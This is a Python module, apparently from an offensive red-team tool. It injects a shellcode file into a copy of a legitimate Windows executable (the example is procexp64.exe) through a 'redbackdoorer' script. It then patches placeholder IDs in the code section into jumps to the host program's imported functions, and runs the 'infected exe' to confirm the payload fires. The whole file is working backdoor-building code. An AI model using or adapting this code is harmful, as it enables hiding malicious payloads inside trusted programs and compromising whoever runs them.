from helper import *
import shutil
import pprint

from pehelper import *
from model import *
from project import project


def inject_exe(shc_file: FilePath):
    exe_in: FilePath = project.inject_exe_in
    exe_out: FilePath = project.inject_exe_out
    exe_capabilities: ExeCapabilities = project.exe_capabilities

    print("--[ Injecting: {} into: {} -> {} ]".format(
        shc_file, exe_in, exe_out
    ))

    # create copy of file exe_in to exe_out
    shutil.copyfile(exe_in, exe_out)

    # inject shellcode into exe_out with redbackdoorer
    # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
    run_process_checkret([
        "python3.exe",
        "redbackdoorer.py",
        project.inject_mode,
        shc_file,
        exe_out
    ])

    # replace IAT in shellcode in code
    # and re-implant it
    if project.source_style == SourceStyle.iat_reuse:
        # get code section of exe_out
        code = get_code_section_data(exe_out)
        for cap in exe_capabilities.get_all().values():
            if not cap.id in code:
                print("Capability ID {} not found, abort".format(cap.id))
                raise Exception()
            
            off = code.index(cap.id)
            current_address = off + exe_capabilities.image_base + exe_capabilities.text_virtaddr
            destination_address = cap.addr
            print("    Replace at 0x{:x} with call to 0x{:x}".format(
                current_address, destination_address
            ))
            jmp = assemble_and_disassemble_jump(
                current_address, destination_address
            )
            code = code.replace(cap.id, jmp)
            write_code_section(exe_out, code)

     
def verify_injected_exe(exefile):
    print("---[ Verify infected exe: {} ]".format(exefile))
    # remove indicator file
    pathlib.Path(verify_filename).unlink(missing_ok=True)

    run_process_checkret([
        exefile,
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(verify_filename):
        print("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(verify_filename)
        return True
    else:
        print("---> Verify FAIL. Infected exe does not work (no file created)")
        return False

